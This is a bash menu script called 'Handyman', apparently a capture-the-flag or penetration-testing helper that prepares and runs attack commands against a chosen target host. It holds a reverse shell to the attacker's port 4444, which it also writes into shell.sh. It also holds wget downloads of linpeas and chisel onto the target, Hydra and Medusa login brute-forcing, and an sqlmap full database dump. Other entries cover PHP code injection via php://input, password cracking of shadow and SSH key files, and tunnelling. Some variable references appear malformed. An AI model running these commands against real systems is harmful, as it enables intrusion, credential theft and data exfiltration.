#! /bin/bash

# Colours!
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'

LHOST=10.9.233.39
CTF_HOST=

EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml

COMMAND_2='Serve this directory'
COMMAND_3='Serve tools'
COMMAND_4='Upload handyman'
COMMAND_5='Generate shell.sh'
COMMAND_6="Add entry to /etc/hosts"
COMMAND_7="Remove entry from /etc/hosts"
COMMAND_8="Setup proxychains config"

COMMAND_e1="rustscan --accessible --ulimit 5000 -a ${RHOST} -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight \"^\d+\/tcp\""
COMMAND_e1map="nmap -Pn -p- ${RHOST}"
COMMAND_e2="ffuf -c -fs 0 -recursion -t 64 -o ffuf.json -e $``W_EXT_COMMON -w $``W_DIR_2_3_MEDIUM -u http://${RHOST}/FUZZ"
COMMAND_e3="whatweb -v ${RHOST}"
COMMAND_e4="wpscan -v -o wpscan.txt --url http://${RHOST}"
COMMAND_e5="~/Tools/enum4linux.pl -GUSnoi ${RHOST} | tee -i samba.txt | highlight \"^user:\[.*\]|^.*\sMapping: OK\""
COMMAND_e6="wfuzz -c -z file,$``W_DIR_2_3_MEDIUM -X POST --hh 45 -u http://${RHOST}/?FUZZ\=test"
COMMAND_e7="ffuf -c -fs 0 -t 64 -o fuff-dns.json -u http://${RHOST} -w $``W_DNS_COMMON -H \"Host: FUZZ.${RHOST}.com\""

COMMAND_v1="nmap -Pn -sV -oN nmap-vuln.txt --script vuln ${RHOST} | highlight \"CVE-\d*-\d*\""
COMMAND_v2="nmap ${RHOST} -p80 -oG - | nikto -o nikto-report.html -h -"
COMMAND_v3="nikto -Plugin dir_traversal -h ${RHOST}"

COMMAND_n1="ssh -i id_rsa $``USER@${RHOST} -p 22"
COMMAND_n2="nc -nlvp 4444"
COMMAND_n3="ssh -i id_rsa $``USER@${RHOST} -L $``RPORT:172.16.0.0:$``LPORT -N -f"
COMMAND_n4="ssh -i id_rsa $``USER@${RHOST} -D 9050 -N -f"
COMMAND_n5="chisel server -p 9999 --reverse -v"
COMMAND_n6="nc -nlvp 5555 | tar xf -"

COMMAND_u1="scp ~/Tools/linpeas.sh $``USER@${RHOST}:/tmp"
COMMAND_u2="scp ~/Tools/chisel $``USER@${RHOST}:/tmp"

COMMAND_b1="hydra -f -I -vV -t 16 -L $``W_USERNAME -P $``W_PASSWORD ${RHOST} ssh -s PORT"
COMMAND_b2="medusa -h ${RHOST} -u $``USER -P $``W_PASSWORD -M http -m DIR:/protected | highlight \"[SUCCESS]\""
COMMAND_b3="hydra -f -I -vV -t 16 -L $``W_USERNAME -P $``W_PASSWORD ${RHOST} -s 80 http-post-form \"/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed\""
COMMAND_b4="ffuf -v -t 8 -X POST -w $``W_DIR_2_3_MEDIUM -u http://${RHOST}/login.php -d \"key=FUZZ\""
COMMAND_b5="fcrackzip -D -v -p $``W_PASSWORD file.zip"
COMMAND_b6="python2 /usr/share/john/ssh2john.py id_rsa > key.hash"
COMMAND_b7="unshadow passwd shadow > key.hash"
COMMAND_b8="john key.hash --wordlist=$``W_PASSWORD --format=FORMAT"
COMMAND_b9="sqlmap --dump-all --tamper=space2comment --dbms=mysql -r BURP_REQUEST_FFILE"
COMMAND_ba="wpscan -v --passwords $``W_PASSWORD --usernames $``USER --url http://${RHOST}"
COMMAND_bb="~/Tools/tplmap/tplmap.py -u http://${RHOST}/ -d 'FIELD_NAME' --os-cmd 'id'"

COMMAND_d1="binwalk -e file.jpg"
COMMAND_d2="steghide extract -sf file.jpg"
COMMAND_d3="7z x file.zip"

COMMAND_t1="haiti HASH"
COMMAND_t2="python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP"
COMMAND_t3="python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD"

COMMAND_p1="cp -R ~/Hacking/Tools/PayloadsAllTheThings/Upload\ Insecure\ Files/Extension\ PHP ./php"

COMMAND_f1='volatility -f $MEM_FILE imageinfo | tee -i mem-info.txt | highlight "Suggested Profile\(s\) : .*"'
COMMAND_f2='volatility -f $MEM_FILE hivelist --profile=$MEM_PROFILE | highlight "0x\S.*(SYSTEM|SAM)"'
COMMAND_f3='volatility -f $MEM_FILE hashdump --profile=$MEM_PROFILE > key.hash'
COMMAND_f4='volatility -f $MEM_FILE pslist --profile=$MEM_PROFILE'
COMMAND_f5='volatility -f $MEM_FILE netscan --profile=$MEM_PROFILE'
COMMAND_f6='volatility -f $MEM_FILE --profile=$MEM_PROFILE malfind -D /tmp'
COMMAND_f7='volatility -f $MEM_FILE --profile=$MEM_PROFILE consoles'

LINK_1="http://${RHOST}"
LINK_2="http://${RHOST}/robots.txt"
LINK_3="http://${RHOST}/sitemap.xml"
LINK_4="https://gtfobins.github.io/"
LINK_5="https://gchq.github.io/CyberChef/"

CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
CLIP_2="export TERM=xterm"
CLIP_3="stty raw -echo; fg"
CLIP_4="bash -i >& /dev/tcp/${LHOST}/4444 0>&1"
CLIP_5="wget -O /tmp/handyman http://${LHOST}:8000/handyman_cp"
CLIP_5="wget -O /tmp/linpeas.sh http://${LHOST}:8000/linpeas.sh"
CLIP_6="wget -O /tmp/chisel http://${LHOST}:8000/chisel"
CLIP_7="/tmp/chisel client ${LHOST}:9999 R:${LHOST}:8888:127.0.0.1:[OPEN_PORT]"
CLIP_8="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://${RHOST}/index.php?page=php://input%00\" -k -v"

LOCAL_="${ORANGE}$(whoami)@${LHOST}${NOCOLOR}"
REMOTE_="${RED}$``USER@${RHOST}${NOCOLOR}"

show_menus() {
  clear
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e "                 $LOCAL_ - Handyman - $REMOTE_"
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e "  ${LIGHTGREEN}Setup${NOCOLOR}"
  echo -e "  ------"
  echo -e "  ${YELLOW}1${NOCOLOR}) Setup target (${YELLOW}R${NOCOLOR}HOST)"
  echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
  echo -e "  ${YELLOW}3${NOCOLOR}) $COMMAND_3"
  echo -e "  ${YELLOW}4${NOCOLOR}) $COMMAND_4"
  echo -e "  ${YELLOW}5${NOCOLOR}) $COMMAND_5"
  echo -e "  ${YELLOW}6${NOCOLOR}) $COMMAND_6"
  echo -e "  ${YELLOW}7${NOCOLOR}) $COMMAND_7"
  echo -e "  ${YELLOW}8${NOCOLOR}) $COMMAND_8"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
  echo -e "  -----------"
  echo -e "  ${YELLOW}e1${NOCOLOR}) $COMMAND_e1 (${YELLOW}e11${NOCOLOR} for output)"
  echo -e "  ${YELLOW}e1map${NOCOLOR}) $COMMAND_e1map"
  echo -e "  ${YELLOW}e2${NOCOLOR}) $COMMAND_e2 (${YELLOW}e22${NOCOLOR} for output)"
  echo -e "  ${YELLOW}e3${NOCOLOR}) $COMMAND_e3"
  echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4 (${YELLOW}e44${NOCOLOR} for output)"
  echo -e "  ${YELLOW}e5${NOCOLOR}) $COMMAND_e5 (${YELLOW}e55${NOCOLOR} for output)"
  echo -e "  ${YELLOW}e6${NOCOLOR}) $COMMAND_e6"
  echo -e "  ${YELLOW}e7${NOCOLOR}) $COMMAND_e7 (${YELLOW}e77${NOCOLOR} for output)"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Vulnerablities${NOCOLOR}"
  echo -e "  --------------"
  echo -e "  ${YELLOW}v1${NOCOLOR}) $COMMAND_v1 (${YELLOW}v11${NOCOLOR} for output)"
  echo -e "  ${YELLOW}v2${NOCOLOR}) $COMMAND_v2 (${YELLOW}v22${NOCOLOR} for output)"
  echo -e "  ${YELLOW}v3${NOCOLOR}) $COMMAND_v3"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Network${NOCOLOR}"
  echo -e "  -------"
  echo -e "  ${YELLOW}n1${NOCOLOR}) $COMMAND_n1"
  echo -e "  ${YELLOW}n2${NOCOLOR}) $COMMAND_n2"
  echo -e "  ${YELLOW}n3${NOCOLOR}) $COMMAND_n3"
  echo -e "  ${YELLOW}n4${NOCOLOR}) $COMMAND_n4"
  echo -e "  ${YELLOW}n5${NOCOLOR}) $COMMAND_n5"
  echo -e "  ${YELLOW}n6${NOCOLOR}) $COMMAND_n6"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
  echo -e "  ------"
  echo -e "  ${YELLOW}u1${NOCOLOR}) $COMMAND_u1"
  echo -e "  ${YELLOW}u2${NOCOLOR}) $COMMAND_u2"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Brute Force/Cracking${NOCOLOR}"
  echo -e "  --------------------"
  echo -e "  ${YELLOW}b1${NOCOLOR}) $COMMAND_b1"
  echo -e "  ${YELLOW}b2${NOCOLOR}) $COMMAND_b2"
  echo -e "  ${YELLOW}b3${NOCOLOR}) $COMMAND_b3"
  echo -e "  ${YELLOW}b4${NOCOLOR}) $COMMAND_b4"
  echo -e "  ${YELLOW}b5${NOCOLOR}) $COMMAND_b5"
  echo -e "  ${YELLOW}b6${NOCOLOR}) $COMMAND_b6"
  echo -e "  ${YELLOW}b7${NOCOLOR}) $COMMAND_b7"
  echo -e "  ${YELLOW}b8${NOCOLOR}) $COMMAND_b8"
  echo -e "  ${YELLOW}b9${NOCOLOR}) $COMMAND_b9"
  echo -e "  ${YELLOW}ba${NOCOLOR}) $COMMAND_ba"
  echo -e "  ${YELLOW}bb${NOCOLOR}) $COMMAND_bb"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Decoding/Extracting${NOCOLOR}"
  echo -e "  --------------------"
  echo -e "  ${YELLOW}d1${NOCOLOR}) $COMMAND_d1"
  echo -e "  ${YELLOW}d2${NOCOLOR}) $COMMAND_d2"
  echo -e "  ${YELLOW}d3${NOCOLOR}) $COMMAND_d3"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Tools${NOCOLOR}"
  echo -e "  -----"
  echo -e "  ${YELLOW}t1${NOCOLOR}) $COMMAND_t1"
  echo -e "  ${YELLOW}t2${NOCOLOR}) $COMMAND_t2"
  echo -e "  ${YELLOW}t3${NOCOLOR}) $COMMAND_t3"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Payloads${NOCOLOR}"
  echo -e "  --------"
  echo -e "  ${YELLOW}p1${NOCOLOR}) PHP payload"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
  echo -e "  -----"
  echo -e "  ${YELLOW}l1${NOCOLOR}) $LINK_1"
  echo -e "  ${YELLOW}l2${NOCOLOR}) $LINK_2"
  echo -e "  ${YELLOW}l3${NOCOLOR}) $LINK_3"
  echo -e "  ${YELLOW}l4${NOCOLOR}) $LINK_4"
  echo -e "  ${YELLOW}l5${NOCOLOR}) $LINK_5"
  echo -e ""
  echo -e "  ${LIGHTGREEN}OSINT${NOCOLOR}"
  echo -e "  -----"
  echo -e "  ${YELLOW}s1${NOCOLOR}) $COMMAND_s1"
  echo -e ""
  echo -e "  ${LIGHTGREEN}FORENSIC${NOCOLOR}"
  echo -e "  -----__"
  echo -e "  ${YELLOW}f1${NOCOLOR}) $COMMAND_f1 (${YELLOW}f11${NOCOLOR} for output)"
  echo -e "  ${YELLOW}f2${NOCOLOR}) $COMMAND_f2"
  echo -e "  ${YELLOW}f3${NOCOLOR}) $COMMAND_f3"
  echo -e "  ${YELLOW}f4${NOCOLOR}) $COMMAND_f4"
  echo -e "  ${YELLOW}f5${NOCOLOR}) $COMMAND_f5"
  echo -e "  ${YELLOW}f6${NOCOLOR}) $COMMAND_f6"
  echo -e "  ${YELLOW}f7${NOCOLOR}) $COMMAND_f7"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Clipboard${NOCOLOR}"
  echo -e "  ---------"
  echo -e "  ${YELLOW}c1${NOCOLOR}) $CLIP_1"
  echo -e "  ${YELLOW}c2${NOCOLOR}) $CLIP_2"
  echo -e "  ${YELLOW}c3${NOCOLOR}) $CLIP_3"
  echo -e "  ${YELLOW}c4${NOCOLOR}) $CLIP_4"
  echo -e "  ${YELLOW}c5${NOCOLOR}) $CLIP_5"
  echo -e "  ${YELLOW}c6${NOCOLOR}) $CLIP_6"
  echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
  echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
  echo -e ""
  echo -e "  (${YELLOW}o${NOCOLOR})pen. Open split"
  echo -e "  e(${RED}x${NOCOLOR})it. Exit"
  echo -e ""
}

setTmuxEnv () {
  tmux setenv LHOST $LHOST
  tmux setenv RHOST $RHOST
  tmux setenv LPORT $PORTT
  tmux setenv RPORT $RPORT
  tmux setenv USER $USER
  tmux setenv CTF_HOST $CTF_HOST
  tmux setenv MEM_FILE $MEM_FILE
  tmux setenv MEM_PROFILE $MEM_PROFILE
}

openSplit() {
  setTmuxEnv

  tmux split-window -v
  sleep 0.1
}

openLink() {
  xdg-open $1
}

exportRHOST() {
  CLIPBOARD=$(xclip -o)

  if [[ $CLIPBOARD =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    export RHOST=$CLIPBOARD

    tmux send-keys "x" ENTER
    tmux send-keys "export RHOST=$CLIPBOARD" ENTER
    tmux send-keys "$0" ENTER
  else
    if [ $1 = 1 ]; then
      openSplit

      tmux send-keys "export RHOST="
    fi
  fi
}

exportLHOST() {
  if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    export LHOST=$1
  fi
}

serveIt() {
  # Serve the folder
  if [ ! command -v python3 &> /dev/null ]; then
    tmux send-keys "python -m SimpleHTTPServer" ENTER
  else
    tmux send-keys "python3 -m http.server" ENTER
  fi
}

runServeTools() {
  openSplit

  # Setup handyman with correct LHOST
  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
  tmux send-keys 'cd ~/Tools' 'C-m'

  serveIt
}

runServeHere() {
  openSplit

  serveIt
}

runUploadHandyman() {
  openSplit

  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
  sleep 0.1

  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
  sleep 0.1

  tmux send-keys "scp ~/Tools/handyman_cp $USER@$RHOST:/tmp/handyman"
}

genShell() {
  echo "bash -i >& /dev/tcp/$LHOST/4444 0>&1" > shell.sh
}

runV() {
  openSplit

  C="$@"
  tmux send-keys "$C"
}

runE() {
  eval "$@"
}

runCat () {
  openSplit

  C=''

  case $1 in
    e1) C="cat nmap-scan.txt | highlight \"^\d+\/tcp\"";;
    e2) C="cat ffuf.json | python -m json.tool";;
    e4) C="cat wpscan.txt | highlight \"CVE-\d*-\d*\"";;
    e5) C="cat samba.txt | highlight \"^user:\[.*\]|^.*\sMapping: OK\"";;
    e7) C="cat ffuf-dns.json | python -m json.tool";;

    v2) C="cat nmap-vuln.txt | highlight \"CVE-\d*-\d*\"";;

    f1) C="cat mem-info.txt | highlight \"Suggested Profile\(s\) : .*\"";;
  esac

  tmux send-keys "$C" Enter
}

runC() {
  echo "$@" | xclip -sel c

  echo "COPIED!"
}

addEtcHosts() {
  if [ -z $1 ]; then
    CLIPBOARD=$(xclip -o)

    if [[ $CLIPBOARD =~ ^\S*\.\S*$ ]]; then
      export CTF_HOST=$CLIPBOARD

      sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"

      openLink "http://$CTF_HOST"
    else
      openSplit

      tmux send-keys "sudo vim /etc/hosts"
    fi
  else
    export CTF_HOST=$1

    sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"

    openLink "http://$CTF_HOST"
  fi
}

removeEtcHosts() {
  # Remove the entry from /etc/hosts
  sudo bash -c "sed -i '/$RHOST/d' /etc/hosts"
}

setupProxyChains() {
  openSplit

  tmux send-keys "cp -n /etc/proxychains.conf ." ENTER
  sleep 0.1

  tmux send-keys "vim ./proxychains.conf" ENTER
}

runExit() {
  exit 0
}

read_options() {
  local choice
  read -p "Enter choice: " choice
  case $choice in
    1) exportRHOST 1;;
    R) exportRHOST 1;;

    2) runServeHere;;
    3) runServeTools;;
    4) runUploadHandyman;;
    5) genShell;;
    6) addEtcHosts;;
    7) removeEtcHosts;;
    8) setupProxyChains;;

    e1) runV $COMMAND_e1;;
    e1map) runV $COMMAND_e1map;;
    e11) runCat 'e1';;
    e2) runV $COMMAND_e2;;
    e22) runCat 'e2';;
    e3) runV $COMMAND_e3;;
    e4) runV $COMMAND_e4;;
    e44) runCat 'e4';;
    e5) runV $COMMAND_e5;;
    e55) runCat 'e5';;
    e6) runV $COMMAND_e6;;
    e7) runV $COMMAND_e7;;
    e77) runCat 'e7';;

    v1) runV $COMMAND_v1;;
    v11) runCat 'v1';;
    v2) runV $COMMAND_v2;;
    v22) openLink 'nikto-report.html';;

    n1) runV $COMMAND_n1;;
    n2) runV $COMMAND_n2;;
    n3) runV $COMMAND_n3;;
    n4) runV $COMMAND_n4;;
    n5) runV $COMMAND_n5;;
    n6) runV $COMMAND_n6;;

    u1) runV $COMMAND_u1;;
    u2) runV $COMMAND_u2;;

    b1) runV $COMMAND_b1;;
    b2) runV $COMMAND_b2;;
    b3) runV $COMMAND_b3;;
    b4) runV $COMMAND_b4;;
    b5) runV $COMMAND_b5;;
    b6) runV $COMMAND_b6;;
    b7) runV $COMMAND_b7;;
    b8) runV $COMMAND_b8;;
    b9) runV $COMMAND_b9;;
    ba) runV $COMMAND_ba;;
    bb) runV $COMMAND_bb;;

    d1) runV $COMMAND_d1;;
    d2) runV $COMMAND_d2;;
    d3) runV $COMMAND_d3;;

    t1) runV $COMMAND_t1;;
    t2) runV $COMMAND_t2;;
    t3) runV $COMMAND_t3;;

    p1) runE $COMMAND_p1;;

    l1) openLink $LINK_1;;
    l2) openLink $LINK_2;;
    l3) openLink $LINK_3;;
    l4) openLink $LINK_4;;

    f1) runV $COMMAND_f1;;
    f11) runCat 'f1';;
    f2) runV $COMMAND_f2;;
    f3) runV $COMMAND_f3;;
    f4) runV $COMMAND_f4;;
    f5) runV $COMMAND_f5;;
    f6) runV $COMMAND_f6;;
    f7) runV $COMMAND_f7;;

    s1) runV $COMMAND_s1;;

    c1) runC $CLIP_1;;
    c2) runC $CLIP_2;;
    c3) runC $CLIP_3;;
    c4) runC $CLIP_4;;
    c5) runC $CLIP_5;;
    c6) runC $CLIP_6;;
    c7) runC $CLIP_7;;
    c8) runC $CLIP_8;;

    o) openSplit;;
    open) openSplit;;
    x) runExit;;
    exit) runExit;;
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

# if [ ! -z "$1" ]; then
#   exportLHOST $1
# fi

if [ ! -z "$1" ]; then
  addEtcHosts $1
fi

do_menu
